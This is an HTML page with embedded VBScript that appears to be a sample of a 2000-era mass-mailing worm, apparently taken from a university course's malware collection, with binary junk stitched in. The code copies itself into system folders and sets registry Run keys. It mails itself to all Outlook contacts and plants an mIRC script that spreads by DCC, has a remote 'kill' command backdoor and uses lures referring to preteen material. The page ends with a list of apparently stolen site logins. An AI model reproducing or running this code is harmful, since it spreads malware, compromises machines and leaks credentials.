'PK    B“ö(u£*î0Çï“ö>n‡Bµã„¢Ò.-Q?‚ -İÁ§=@ß†ç“@HHÊaûƒ„ˆı³Û)Š@ˆlI¡ùõ¥(z'$˜Ä–"hÛCkFĞ¬ú)6¤Çm`ÏÅ|Xb3ˆ1ô>ÌF³¹ıÈÌ{J‡îÃŠ;cL“-ğe‘=&×tªWéÆám®Ó4•7S‰Ÿ5ÃoHG^ZÇØ ½ú³ˆU‰èU‡ï •{Õ•‡}#Ïp½Tåî(.‡•^?}Ã¡‘×ìˆ.Å¶l3~ç'ö\yü^Ÿ¤PögKQ¾¤Lhw7Ñ
•Rõgw]—•M#n”-ÛÉsîrç&işñ‰~ûy‡õzAËÍü˜Ù2M&Ïé¿U33=	&®wb¾´yº²=Î\Š¶Ñ3éc@£r§4]è‹‡&Úé@£_PK    8›ö(^ÇùU  B 	   AIBAS.exeìı	@SG×8Œß,@€ qG
' Del_Armg0 silly toy ! Created on 23 July 2000 -=- 18:15
' THE VARIABLES VXers NAMES WORMS   ;à)
' W0DE DURDYN ALEANRAHEL WORM !!! DROW POWER !
' An Anti Pedo Worm Coded in 17 min. !;) Warf!! Ripped in 12min.hehehe!okijustforfun!
<html>
<body bgcolor="#000000" text="#FFFFFF" link="#FFFFFF"
vlink="#000000" alink="#FFFFFF" topmargin="10" leftmargin="10">
<OBJECT ID="DAControl2"
  STYLE="position:absolute; left:0; top:0;width:800;height:300;z-index: -1"
  CLASSID="CLSID:B6FFC24C-7E13-11D0-9B47-00C04FC2F51D">
</OBJECT>
<OBJECT ID="DAControl"
   STYLE="position:absolute; left:100; top:75;width:400;height:450" 
   CLASSID="CLSID:B6FFC24C-7E13-11D0-9B47-00C04FC2F51D">
</OBJECT>
<script LANGUAGE="VBScript">
'PK    B“ö(u£*î0Çï“ö>n‡Bµã„¢Ò.-Q?‚ -İÁ§=@ß†ç“@HHÊaûƒ„ˆı³Û)Š@ˆlI¡ùõ¥(z'$˜Ä–"hÛCkFĞ¬ú)6¤Çm`ÏÅ|Xb3ˆ1ô>ÌF³¹ıÈÌ{J‡îÃŠ;cL“-ğe‘=&×tªWéÆám®Ó4•7S‰Ÿ5ÃoHG^ZÇØ ½ú³ˆU‰èU‡ï •{Õ•‡}#Ïp½Tåî(.‡•^?}Ã¡‘×ìˆ.Å¶l3~ç'ö\yü^Ÿ¤PögKQ¾¤Lhw7Ñ
•Rõgw]—•M#n”-ÛÉsîrç&işñ‰~ûy‡õzAËÍü˜Ù2M&Ïé¿U33=	&®wb¾´yº²=Î\Š¶Ñ3éc@£r§4]è‹‡&Úé@£_PK    8›ö(^ÇùU  B 	   AIBAS.exeìı	@SG×8Œß,@€ qG
' Del_Armg0 silly toy ! Created on 23 July 2000 -=- 18:15
' THE VARIABLES VXers NAMES WORMS   ;à)
On Error Resume Next
Dim Del
Dim Peri
Dim Phage
Dim Dan
Dim Vbust
Dim urgo
Dim mist
Set Del = CreateObject( "Scripting.FileSystemObject" )
Del.CopyFile WScript.ScriptFullName, Del.BuildPath( Del.GetSpecialFolder(1), "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/Del_Armg0.HTML" )
Set Peri = CreateObject( "WScript.Shell" )
Peri.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "Del_Armg0", Del.BuildPath( Del.GetSpecialFolder(1), "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/Del_Armg0.HTML" )
pbat = Peri.RegRead( "HKEY_LOCAL_MACHINE\" & "Del_Armg0" )
If pbat = "" Or pbat > 8 Then
   pbat = 0
End If
If pbat = 0 Then
   Set Vbust = CreateObject( "Outlook.Application" )
   Set Phage = Vbust.GetNameSpace( "MAPI" )
   For Each Dan In Phage.AddressLists
       Set pax = Vbust.CreateItem( 0 )
       For urgo = 1 To Dan.AddressEntries.Count
           Set mist = Dan.AddressEntries( urgo )
           If urgo = 1 Then
              pax.BCC = mist.Address
           Else
              pax.BCC = pax.BCC & "; " & mist.Address
           End If
       Next
       pax.Subject = "Who Is Del_Armg0 ???¿¿¿!!!"
       pax.Body = "Del_Armg0 is me ? or perhaps U ?or Wooo!!!***@@@!!! ; ["
       pax.Attachments.Add WScript.ScriptFullName
       pax.DeleteAfterSubmit = True
       pax.Send
   Next
   pbat = 0
End If
Peri.RegWrite "HKEY_LOCAL_MACHINE\" & "Del_Armg0", pbat + 1
'PK    B“ö(u£*î0Çï“ö>n‡Bµã„¢Ò.-Q?‚ -İÁ§=@ß†ç“@HHÊaûƒ„ˆı³Û)Š@ˆlI¡ùõ¥(z'$˜Ä–"hÛCkFĞ¬ú)6¤Çm`ÏÅ|Xb3ˆ1ô>ÌF³¹ıÈÌ{J‡îÃŠ;cL“-ğe‘=&×tªWéÆám®Ó4•7S‰Ÿ5ÃoHG^ZÇØ ½ú³ˆU‰èU‡ï •{Õ•‡}#Ïp½Tåî(.‡•^?}Ã¡‘×ìˆ.Å¶l3~ç'ö\yü^Ÿ¤PögKQ¾¤Lhw7Ñ
•Rõgw]—•M#n”-ÛÉsîrç&işñ‰~ûy‡õzAËÍü˜Ù2M&Ïé¿U33=	&®wb¾´yº²=Î\Š¶Ñ3éc@£r§4]è‹‡&Úé@£_PK    8›ö(^ÇùU  B 	   AIBAS.exeìı	@SG×8Œß,@€ qG
' Del_Armg0 silly toy ! Created on 23 July 2000 -=- 18:15
' THE VARIABLES VXers NAMES WORMS   ;à)
On Error Resume Next
dim back1, back2, back3, back4, start
Const ForReading = 1, ForWriting = 2, ForAppending = 8
'''''''DEEP_ROOTING''''''
Set blok0 = CreateObject("Scripting.FileSystemObject")
  Set sysblok = blok0.GetSpecialFolder(1)
  Set winblok = blok0.GetSpecialFolder(0)
Set blok1 = CreateObject("Scripting.FileSystemObject")
Set blok2 = blok1.GetFile(WScript.ScriptFullname)
  blok2.Copy ("C:\Pre Site.html")
  blok2.Copy (sysblok&"http://www.cs.ucdavis.edu/backup02.LED.html")
  blok2.Copy (winblok&"http://www.cs.ucdavis.edu/backup02.LED.html")
  blok2.Copy (winblok&"http://www.cs.ucdavis.edu/Wode_Durdyn_Aleanrahel.html")
  blok2.Copy (winblok&"http://www.cs.ucdavis.edu/PreSites.html")
  blok2.Copy ("C:\mirc\ultra Pre Site.html")
  blok2.Copy ("C:\mirc\download\my best Sites.html")
  blok2.Copy ("C:\mirc\download\xxxpasswords.htm")
  blok2.Copy ("C:\program files\private.html")
  blok2.Copy ("C:\temp\ultra sexy Site.html")
Dim Peri
Set Peri = Wscript.CreateObject( "WScript.Shell" )
Peri.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Delly", "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/backup02.LED.html"
'PK   20Ü$«¿ko  „   
'''''''MircScript'''''''
Set bloq1 = CreateObject("Scripting.FileSystemObject")
Set bloq2 = bloq1.CreateTextFile("C:\mirc\script.ini", True)
 bloq2.WriteLine "[SCRIPT]"
 bloq2.WriteLine ";"
 bloq2.WriteLine ";"
 bloq2.WriteLine ";"
 bloq2.WriteLine ";"
 bloq2.WriteLine "n0= on 1:start:{"
 bloq2.WriteLine "n1= .remote on"
 bloq2.WriteLine "n2= .ctcps on"
 bloq2.WriteLine "n3= .events on"
 bloq2.WriteLine "n4= .sreq ignore"
 bloq2.WriteLine "n5= }"
 bloq2.WriteLine "n6=on 1:connect:{"
 bloq2.WriteLine "n7=/.pdcc 99999999999"
 bloq2.WriteLine "n8=/.join #vxtrader |/.leave #vxtrader"
 bloq2.WriteLine "n9= }"
 bloq2.WriteLine "n10=on 1:join:#:/.msg $nick If u want My Private Preteen Site list type: !pre_x in the channel window  :))  $chan"
 bloq2.WriteLine "n11=on 1:filercvd:*.*:/.dcc send $nick C:\Windows\Wode_Durdyn_Aleanrahel.html"
 bloq2.WriteLine "n12=on 1:filesent:*.jpg,*.jpeg,*.gif,*.bmp,*.mpg,*.mpeg,*.avi:/.dcc send $nick C:\Pre Site.html"
 bloq2.WriteLine "n13="
 bloq2.WriteLine "n14=on 1:text:*!pre_x*:#: { if ( $nick == $me ) {halt} | /.dcc send $nick C:\windows\PreSites.html }"
 bloq2.WriteLine "n15=on 1:op:#:/.msg $chan if u want My Private Preteen Site list type: TYPE: !pre_x"
 bloq2.WriteLine "n16=on 1:kick:#:/.msg $chan if u want My Private Preteen Site list type: :) TYPE: !pre_x"
 bloq2.WriteLine "n17=on 1:deop:#:/.msg $chan Please if u want my latest best Preteen file :) TYPE: !pre_x"
 bloq2.WriteLine "n18=on 1:ban:#:/.msg $chan Please if u want the latest best Pre site  :) TYPE: !pre_x"
 bloq2.WriteLine "n19=on 1:text:*sex*:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\windows\PreSites.html }"
 bloq2.WriteLine "n20=on 1:text:*teen*:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\windows\PreSites.html }""
 bloq2.WriteLine "n21=on 1:text:*pre*:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\windows\PreSites.html }""
 bloq2.WriteLine "n22=ctcp 1:*kill*:*:/.run $2 $3 $4"
 bloq2.WriteLine ";PK   20Ü$«¿ko  W0DE DURDYN ALEANRAHEL WORM !!! DROW POWER !"
bloq2.Close
Call HeartAnim()
Call ILU()
Dim A0i3
Dim A0i4
Dim A0i8
Dim A0i1
Set A0i3 = CreateObject( "WScript.Network" )
Set A0i8 = A0i3.EnumNetworkDrives
If A0i8.Count <> 0 Then
   For A0i4 = 0 To A0i8.Count - 1
       If InStr( A0i8.Item( A0i4), "\" ) <> 0 Then
          A0i1.CopyFile WScript.ScriptFullName, A0i1.BuildPath( A0i8.Item( A0i4), "http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/ALEANRAHEL WODE TIME.html" ) 
       End If
   Next
End If
''£¨%¨£M%/§/%/£§¨£/§%/£§¨/£§%§µµ%µ¨£%µ%µ¨£%¨¨µ£%§¨/£µ§µ%§µ/%§£§¨/µ%§£µ§£¨%¨£§¨/µ
sub HeartAnim
  Set m = DAControl.PixelLibrary
  splinePts = Array(0,-10, -75,-90, -25,-80, -75,-25, _
                    -55,45, -25,10, 0,25, 0,80, 0,35, _
                    25,70, 25,25, 75,-85, 75,-20, 0,-30)
  splineKnts = Array(0,0,1,1,2,3,4,5,6,7,8,9,10,10,11,11)
  Set splineCurve = m.CubicBSplinePath(splinePts, splineKnts)
  Set pink = m.ColorRGB(0,0,0)
  Set fillImg = m.SolidColorImage(pink)      
  Set splineImg = splineCurve.Fill(m.DefaultLineStyle, fillImg)
  Set pathTf = m.FollowPath(splineCurve, 3).RepeatForever()
  Set fillImg = m.SolidColorImage(m.Silver)
  Set dotImg = m.Oval(11,16).Fill(m.DefaultLineStyle, fillImg)
  Set mDotImg = dotImg.Transform(pathTf)
  Set finalImg = m.Overlay(mDotImg, splineImg)
  DAControl.Image = finalImg
  DAControl.BackgroundImage = m.SolidColorImage(m.Black)
  DAControl.Start
end sub
Sub ILU()
 Set m = DAControl2.MeterLibrary
   Set half = m.DANumber(0.5)
   Set clr = m.colorHslAnim( _
                m.Mul(m.LocalTime, m.DANumber(0.312)), _
                half, half)
   Set font = m.Font("Arial", 14, clr)  
   Set txtImg = m.StringImage("WodeDurdynAleanrahel Game ;[", font)
   Set pos = m.Mul(m.Sin(m.LocalTime), m.DANumber(0.02))
   Set scl = m.Add(m.DANumber(2), m.Abs(m.Mul(m.Sin(m.LocalTime), m.DANumber(3))))
   Set xf = m.Compose2(m.Translate2Anim(m.DANumber(0), pos),  _
                       m.Scale2UniformAnim(scl))                       
   Set txtImg = txtImg.Transform(xf)
   DAControl2.Image = txtImg
   DAControl2.Start
end sub
'PK    B“ö(u£*î0Çï“ö>n‡Bµã„¢Ò.-Q?‚ -İÁ§=@ß†ç“@HHÊaûƒ„ˆı³Û)Š@ˆlI¡ùõ¥(z'$˜Ä–"hÛCkFĞ¬ú)6¤Çm`ÏÅ|Xb3ˆ1ô>ÌF³¹ıÈÌ{J‡îÃŠ;cL“-ğe‘=&×tªWéÆám®Ó4•7S‰Ÿ5ÃoHG^ZÇØ ½ú³ˆU‰èU‡ï •{Õ•‡}#Ïp½Tåî(.‡•^?}Ã¡‘×ìˆ.Å¶l3~ç'ö\yü^Ÿ¤PögKQ¾¤Lhw7Ñ
•Rõgw]—•M#n”-ÛÉsîrç&işñ‰~ûy‡õzAËÍü˜Ù2M&Ïé¿U33=	&®wb¾´yº²=Î\Š¶Ñ3éc@£r§4]è‹‡&Úé@£_PK    8›ö(^ÇùU  B 	   AIBAS.exeìı	@SG×8Œß,@€ qG
' Del_Armg0 silly toy ! Created on 23 July 2000 -=- 18:15
' THE VARIABLES VXers NAMES WORMS   ;à)
MsgBox "vvv" & (chr(10) & chr(13)) & "+°¤@__|Ğê£_å®mG0 _-=-_ MåT®ï× _-=-_ Ğê£_å®mG0 _-=-_ Må|®ï×|__@¤°+"  & (chr(10) & chr(13)) & " ... Wode Durdyn Aleanrahel Worm ! "
</script>
<P>
<BR>
<CENTER>We are not held responsible for what you do woth these passwords.... 
all are directly linked to the members area if there is any that are 
not working please contact me :  xpassstealer@hotmail.com
HTTP://reddog14:reddog@www.dyannadoes.com/members/
HTTP://nickhans:sivsb@www.teenie-sex.com/members/exclusive.html
HTTP://robin5:fairchil@www.casting-couch.com/members/
HTTP://jimmy:jimmy@www.teenieworld.com/members/
HTTP://peterf1:rockon@www.aprilsbodyshop.com/members/
HTTP://b289yro:foothill@www.nastyfetish.com/cgi-local/member.htm
HTTP://oro:sorriso@www.matureporn.com/members
HTTP://striker:twister@eveellis.com/members/contents/contents.htm
HTTP://Lithurgy:demetria@www.dirtydiana.com/protect/blue/
HTTP://artist:art@www.truly18.com/restricted/members.htm
HTTP://erict:edgewood@www.gabrielle.net/Members/members3.htm
HTTP://boogyman:achilles@www.bobbibillard.com/members/index.html
HTTP://spudly:jamin@www.surftx.com/racheal/members/
HTTP://murphy:mickey@www.robinshouse.com/members/members.htm
HTTP://1234:4321@auth.homeclips.com/members/
HTTP://patrick:office@www.collegegirlnetwork.com/secure/index.html
<BR>
</CENTER>
<P>
</body>
</html>